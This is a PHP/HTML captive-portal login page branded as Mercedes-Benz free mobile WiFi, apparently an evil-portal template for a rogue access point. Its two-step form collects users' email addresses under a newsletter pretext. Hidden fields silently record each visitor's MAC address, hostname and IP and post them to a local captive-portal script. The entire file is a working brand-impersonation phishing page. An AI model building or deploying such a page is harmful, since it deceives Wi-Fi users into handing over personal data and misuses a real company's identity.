<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Colorlib Templates">
    <meta name="author" content="root" >
    <meta name="keywords" content="Colorlib Templates">

    <!-- Title Page-->
    <title>Mercedes-Benz International:Mobile WiFi</title>

    <!-- Icons font CSS-->
    <link href="assets/vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">
    <link href="assets/vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
  	 <link rel="apple-touch-icon" sizes="180x180" href="assets/images/apple-touch-icon.png"> 
    <link rel="icon" type="image/png" href="assets/images/favicon-32x32.png" sizes="32x32"> 
    <link rel="icon" type="image/png" href="assets/images/favicon-16x16.png" sizes="16x16"> 
    <link rel="shortcut icon" href="assets/images/favicon.ico"> 
    <!-- Font special for pages-->
    <link href="assets/css/css?family=Poppins:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">

    <!-- Vendor CSS-->
    <link href="assets/vendor/select2/select2.min.css" rel="stylesheet" media="all">
    <link href="assets/vendor/datepicker/daterangepicker.css" rel="stylesheet" media="all">

    <!-- Main CSS-->
    <link href="assets/css/main.css" rel="stylesheet" media="all">
</head>

<body>
<div class="tab">
    <div class="page-wrapper bg-gra-01 p-t-100 p-b-100 font-poppins">
        <div class="wrapper wrapper--w780">
            <div class="card card-3">
                <div class="card-heading"></div>
                <div class="card-body">

                <img src="assets/images/mc.png" alt="mclogo" class="img">
					 <h2 class="title">Free WiFi</h2>
					  <p>A New Era in Mobility & Connectivity</p>
					  <br>
 					  <p>Enter Your Email to Get a Token*</p>
 					  
                 <br>
                    <form method="POST" action="/captiveportal/index.php" target="hiddenFrame">        
                        <div class="input-group">
                            <input class="input--style-3" type="email" placeholder="Email" name="email"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
                            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
 									 <input type="hidden" name="gettoken" value="gettoken">
                        </div>
                        <div class="p-t-10">
                            <button class="btn btn--pill btn--green" type="submit" style="float: left;" onclick="nextPrev(1)">Get Token</button><button class="btn btn--pill btn--green" type="submit" style="float: right;" onclick="nextPrev(1)">Next</button>
                        </div>
                    </form>

                </div>
            </div>
            <div class="footer"><p>*You will sign up for our newsletter, in return you will get a Token to access the internet !</p></div>
        </div>
    </div>
    <iframe name="hiddenFrame" width="0" height="0" border="0" style="display: none;"></iframe>
    </div>
    
    <div class="tab">
    <div class="page-wrapper bg-gra-01 p-t-100 p-b-100 font-poppins">
        <div class="wrapper wrapper--w780">
            <div class="card card-4">
                <div class="card-heading"></div>
                <div class="card-body">
                  <img src="assets/images/mc.png" alt="mclogo" class="img">
                    <h2 class="title">WiFi Register</h2>
 					     <p>Enter Your Name & Token</p>
 					     <br>
                    <form  method="POST" id="regForm" action="/captiveportal/index.php">
                        <div class="input-group">
                           <input class="input--style-3" type="email" placeholder="Email" name="email"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
                        </div>
                        <div class="input-group">
                            <input class="input--style-3" type="text" placeholder="Token" name="token"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
                            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
								    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
								    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
								    <input type="hidden" name="target" value="https://www.mercedes-benz.com">
								    <input type="hidden" name="getaccess" value="getaccess">
                        </div>
                        <div class="p-t-10">
                        <button class="btn btn--pill btn--green" type="submit" style="float: left;" onclick="nextPrev(-1)">Back</button><button class="btn btn--pill btn--green" type="submit"style="float: right";>Submit</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    </div>
    




    <!-- Jquery JS-->
    <script src="assets/vendor/jquery/jquery.min.js"></script>
    <!-- Vendor JS-->
    <script src="assets/vendor/select2/select2.min.js"></script>
    <script src="assets/vendor/datepicker/moment.min.js"></script>
    <script src="assets/vendor/datepicker/daterangepicker.js"></script>

    <!-- Main JS-->

    <script src="assets/js/global.js"></script>
    
<script>
var currentTab = 0; // Current tab is set to be the first tab (0)
showTab(currentTab); // Display the current tab

function showTab(n) {
  // This function will display the specified tab of the form...
  var x = document.getElementsByClassName("tab");
  x[n].style.display = "block";
  //... and fix the Previous/Next buttons:
}

function nextPrev(n) {
  // This function will figure out which tab to display
  var x = document.getElementsByClassName("tab");
  // Exit the function if any field in the current tab is invalid:
  if (n == 1 && !validateForm()) return false;
  // Hide the current tab:
  x[currentTab].style.display = "none";
  // Increase or decrease the current tab by 1:
  currentTab = currentTab + n;
  // if you have reached the end of the form...
  if (currentTab >= x.length) {
    // ... the form gets submitted:
    document.getElementById("regForm").submit();
    return false;
  }
  // Otherwise, display the correct tab:
  showTab(currentTab);
}

function validateForm() {
  // This function deals with validation of the form fields
  var x, y, i, valid = true;
  x = document.getElementsByClassName("tab");
  y = x[currentTab].getElementsByTagName("input");
  // A loop that checks every input field in the current tab:
  for (i = 0; i < y.length; i++) {
    // If a field is empty...
    if (y[i].value == "") {
      // add an "invalid" class to the field:
      y[i].className += " invalid";
      // and set the current valid status to false
      valid = false;
    }
  }
  // If the valid status is true, mark the step as finished and valid:
  return valid; // return the valid status
}


</script>



</body>

</html>
<!-- end document-->